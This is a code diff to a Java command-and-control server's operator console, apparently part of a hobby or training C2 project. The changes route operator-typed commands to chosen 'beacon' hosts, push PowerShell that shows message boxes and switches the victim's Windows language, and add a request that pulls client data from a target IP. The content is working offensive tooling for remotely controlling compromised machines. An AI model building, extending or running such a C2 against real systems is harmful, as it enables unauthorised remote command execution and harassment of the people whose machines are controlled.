@@ -193,7 +193,7 @@ public class C2ServerUserHandler implements Runnable{
 
         if(userInput.equals("1") || userInput.equals("2")){
             System.out.print("Enter Command to be run >> ");
-            String finalCommand = currentUserPath + " " + userInputScanner.nextLine();
+            String finalCommand = currentUserPath + "_" + userInputScanner.nextLine();
             C2server.broadcastToBeacons(finalCommand);
             currentUserPath = "Command " + OS;
         }
@@ -331,7 +331,7 @@ public class C2ServerUserHandler implements Runnable{
                     commands += "Start-Sleep -Seconds 60;";
                     commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                     commands += "Set-WinUserLanguageList en-US;";
-                    C2server.broadcastToBeacons(" Windows " + target + " " + commands);
+                    C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
                 } else if (userInput.equals("3")){
                     System.out.println("Enter IP address of individual target, or 'All' for all clients: ");
                     String target = userInputScanner.nextLine();
@@ -351,15 +351,17 @@ public class C2ServerUserHandler implements Runnable{
                     }
                     commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
                     commands += "Set-WinUserLanguageList en-US;";
-                    C2server.broadcastToBeacons(" Windows " + target + " " + commands);
+                    C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
                 } else if (userInput.equals("4")){
+                    System.out.println("Enter IP address of individual target, or 'All' for all clients: ");
+                    String target = userInputScanner.nextLine();
                     // Send a message box
                     String commands = "";
                     commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
                     System.out.println("Enter A Message to Display: ");
                     String message = userInputScanner.nextLine();
                     commands += "[System.Windows.MessageBox]::Show('"+ message+ "');";
-                    C2server.broadcastToBeacons(commands);
+                    C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
                 }else if (userInput.equals("5")){
                     currentUserPath = "";
                 } else {
@@ -391,7 +393,11 @@ public class C2ServerUserHandler implements Runnable{
                 } else if (userInput.equals("3")){
                     System.out.print("Enter IP Address for desired request >> ");
                     String IPAddress = userInputScanner.nextLine();
-                    // TODO figure out how to send request to beacon server
+                    C2server.broadcastToBeacons("Request ClientData Windows " + IPAddress);
+                    C2server.broadcastToBeacons("Request ClientData Linux " + IPAddress);
+                    try {
+                        waitForResponse();
+                    } catch (InterruptedException e) {e.printStackTrace();}
                 } else if (userInput.equals("4")){
                         currentUserPath = "";
                 } else {
